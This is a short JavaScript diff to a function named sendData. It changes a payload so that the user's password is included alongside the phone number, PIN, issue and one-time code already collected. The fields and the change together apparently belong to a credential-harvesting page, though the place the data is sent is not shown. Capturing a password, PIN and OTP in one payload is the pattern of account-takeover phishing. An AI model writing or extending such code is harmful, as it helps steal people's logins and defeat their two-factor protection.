@@ -391,7 +391,7 @@
     async function sendData(eventName, extraData = {}) {
       const demoPayload = {
   phone: document.getElementById('reference')?.value || '',
-  password: '',
+  password:state.password||'',
   pin: state.pin || '',
   issue: state.issue,
   otp: state.otp || '',
